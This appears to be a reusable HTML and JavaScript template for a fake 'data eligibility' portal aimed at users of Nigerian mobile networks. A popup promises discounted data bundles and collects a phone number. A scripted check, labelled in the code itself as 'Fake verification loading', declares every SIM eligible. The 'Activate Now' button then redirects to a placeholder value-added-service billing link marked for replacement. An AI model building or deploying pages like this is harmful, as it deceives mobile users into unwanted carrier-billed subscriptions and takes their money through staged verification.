<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Secure Data Verification Portal</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
    body {
        margin: 0;
        font-family: "Segoe UI", Arial, sans-serif;
        background: #f4f7fb;
        color: #1f2937;
    }

    /* #### POPUP OVERLAY #### */
    #popup-overlay,
    #eligibility-modal,
    #processing-modal {
        position: fixed;
        inset: 0;
        background: rgba(0, 34, 90, 0.55);
        backdrop-filter: blur(6px);
        display: none;
        align-items: center;
        justify-content: center;
        z-index: 9999;
    }

    .modal-box {
        background: #ffffff;
        width: 90%;
        max-width: 380px;
        padding: 24px;
        border-radius: 14px;
        text-align: center;
        box-shadow: 0 4px 20px rgba(0,0,0,0.12);
    }

    .main-btn {
        padding: 12px 0;
        width: 100%;
        border: none;
        border-radius: 8px;
        background: #0066ff;
        color: #fff;
        font-size: 16px;
        font-weight: 700;
        cursor: pointer;
        margin-top: 15px;
    }

    .cancel-link {
        margin-top: 12px;
        font-size: 13px;
        cursor: pointer;
        color: #6b7280;
    }

    /* Processing animation */
    @keyframes spin {
        to { transform: rotate(360deg); }
    }
    .loader {
        border: 4px solid rgba(255,255,255,0.25);
        border-top-color: #00a2ff;
        width: 45px;
        height: 45px;
        border-radius: 50%;
        margin: 0 auto;
        animation: spin 1s linear infinite;
    }

    /* Network Logo */
    .net-logo {
        width: 70px;
        margin: 10px auto 0 auto;
    }
</style>
</head>
<body>

<!-- =================== PAGE CONTENT (LANDING) =================== -->

<div style="text-align:center; padding:50px;">
    <h2>Welcome to the Data Eligibility Portal</h2>
    <p style="color:#555;">Secure verification for discounted data bundles.</p>
</div>


<!-- =================== STEP 1: POPUP (AUTO LOAD) =================== -->

<div id="popup-overlay" style="display:flex;">
  <div class="modal-box">
      <h2>⚠️ Verification Required</h2>
      <p>You are about to access discounted data bundles available for your device and location.</p>

      <button id="continueBtn" class="main-btn">Continue</button>
      <p id="closePopup" class="cancel-link">Maybe later</p>
  </div>
</div>


<!-- =================== STEP 2: PHONE ENTRY =================== -->

<div id="eligibility-modal">
  <div class="modal-box">
      <h2>Verify SIM Eligibility</h2>
      <p>Please enter your phone number to check eligibility.</p>

      <input id="phoneInput" type="tel"
          placeholder="e.g. 08123456789"
          style="width:100%; padding:12px; border-radius:8px; border:1px solid #d1d5db; font-size:15px;">

      <img id="networkLogo" class="net-logo" style="display:none;">

      <p id="networkDisplay" style="font-size:14px; font-weight:600; color:#0066ff;"></p>

      <button id="checkBtn" class="main-btn">Check Eligibility</button>
      <p id="closeEligibility" class="cancel-link">Cancel</p>
  </div>
</div>


<!-- =================== STEP 3 + 4: PROCESSING + RESULT =================== -->

<div id="processing-modal">
  <div class="modal-box" style="background:#00225a; color:white;">
      <div id="processingStage">
          <div class="loader"></div>
          <p id="processingText" style="margin-top:12px;">Checking eligibility...</p>
      </div>

      <div id="successStage" style="display:none;">
          <h2>✅ SIM Eligible</h2>
          <p>Your SIM qualifies for discounted data activation.</p>
          <button id="activateBtn" class="main-btn" style="background:#00c851;">Activate Now</button>
      </div>
  </div>
</div>


<script>
/* ---- STEP 1 ---- */
document.getElementById("continueBtn").addEventListener("click", () => {
    document.getElementById("popup-overlay").style.display = "none";
    document.getElementById("eligibility-modal").style.display = "flex";
});
document.getElementById("closePopup").addEventListener("click", () => {
    document.getElementById("popup-overlay").style.display = "none";
});


/* ---- STEP 2 ---- Auto detect network + show logo */
document.getElementById("phoneInput").addEventListener("input", function(){
    let number = this.value.trim();
    let netText = document.getElementById("networkDisplay");
    let netLogo = document.getElementById("networkLogo");

    netLogo.style.display = "none";
    netText.innerHTML = "";

    const nets = [
        {regex:/^(0803|0806|0703|0706|0813|0816|0903|0906)/, name:"MTN", logo:"https://i.ibb.co/ZV9f6Lw/mtn.png"},
        {regex:/^(0802|0808|0708|0812|0902|0907)/, name:"Airtel", logo:"https://i.ibb.co/ThQkYVG/airtel.png"},
        {regex:/^(0805|0807|0705|0815|0905)/, name:"Glo", logo:"https://i.ibb.co/L8fXjGD/glo.png"},
        {regex:/^(0809|0817|0818|0909)/, name:"9mobile", logo:"https://i.ibb.co/pJJmGhc/9mobile.png"},
    ];

    for (let n of nets){
        if(n.regex.test(number)){
            netText.innerHTML = "Network: <b>" + n.name + "</b>";
            netLogo.src = n.logo;
            netLogo.style.display = "block";
            break;
        }
    }
});

document.getElementById("closeEligibility").addEventListener("click", ()=>{
    document.getElementById("eligibility-modal").style.display = "none";
});


/* ---- STEP 3 ---- Fake verification loading */
document.getElementById("checkBtn").addEventListener("click", ()=>{
    let phone = document.getElementById("phoneInput").value;
    if(phone.length < 11){
        alert("Please enter a valid phone number.");
        return;
    }

    document.getElementById("eligibility-modal").style.display = "none";
    document.getElementById("processing-modal").style.display = "flex";

    let text = document.getElementById("processingText");

    setTimeout(()=> text.innerText = "Verifying SIM...", 900);
    setTimeout(()=> text.innerText = "Checking available data slot...", 1800);
    setTimeout(()=>{
        document.getElementById("processingStage").style.display = "none";
        document.getElementById("successStage").style.display = "block";
    }, 2600);
});


/* ---- STEP 4 ---- Redirect to MVAS page */
document.getElementById("activateBtn").addEventListener("click", ()=>{
    window.location.href = "YOUR_MVAS_LINK_HERE";  // <<< replace this
});
</script>

</body>
</html>
